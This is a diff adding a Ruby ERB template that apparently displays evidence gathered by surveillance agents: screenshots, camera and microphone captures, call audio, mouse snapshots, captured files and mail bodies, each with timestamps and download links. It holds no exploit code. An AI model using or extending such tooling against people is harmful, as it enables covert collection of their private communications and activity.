@@ -1,0 +1,74 @@
+<tr>
+  <td class="id"><%= row[:_id] %></td>
+
+  <td class="agent"><%= row[:agent] %></td>
+
+  <td class="acquired"><%= Time.at(row[:da]).strftime('%Y-%m-%d %H:%M:%S') %></td>
+
+  <td class="received"><%= Time.at(row[:dr]).strftime('%Y-%m-%d %H:%M:%S') %></td>
+
+  <td class="rel<%= row[:rel] %>"></td>
+
+  <td class="type"><%= row[:type] %></td>
+
+  <td class="info">
+    <table class="inner">
+      <tbody>
+
+      <% row[:data].each_pair do |k, v| %>
+        <% next if ['_grid', '_grid_size', 'md5', 'body', 'status'].include?(k) %>
+
+        <tr>
+          <td class="inner"><%= k %></td>
+          <% v.gsub! /\n/, '<br>' if v.class == String %>
+          <% v = Time.at(v.to_i) if k == 'begin' or k == 'end' %>
+          <td class="inner"><%= v %></td>
+        </tr>
+      <% end %>
+
+      <% case row[:type]
+         when 'screenshot', 'camera', 'print' %>
+        <tr>
+          <td class="inner">image</td>
+          <td class="inner"><%= html_image(row[:data]['_grid'].to_s + '.jpg') %></td>
+        </tr>
+      <% when 'mouse' %>
+        <tr>
+          <td class="inner">image</td>
+          <td class="inner"><%= html_image(row[:data]['_grid'].to_s + '.jpg', 40) %></td>
+        </tr>
+      <% when 'call', 'mic' %>
+        <% unless row[:data]['_grid'].nil? %>
+          <tr>
+            <td class="inner">audio</td>
+            <td class="inner"><%= html_mp3_player(row[:data]['_grid'].to_s + '.mp3') %></td>
+          </tr>
+        <% end %>
+      <% when 'file' %>
+        <% if row[:data]['type'] == :capture %>
+          <tr>
+            <td class="inner">file</td>
+            <td class="inner">
+              <a href="<%= row[:data]['_grid'].to_s + File.extname(row[:data]['path']) %>" title="Download">[+]</a>
+            </td>
+          </tr>
+        <% end %>
+      <% when 'message' %>
+        <% if row[:data]['type'] == :mail %>
+          <tr>
+            <td class="inner">body</td>
+            <td class="inner">
+              <a href="<%= row[:data]['_grid'].to_s + '.txt' %>" title="Download">[+]</a>
+            </td>
+          </tr>
+        <% end %>
+      <% end %>
+
+      </tbody>
+    </table>
+  </td>
+
+  <% if display_notes %>
+    <td class="note"><%= row[:note] %></td>
+  <% end %>
+</tr>
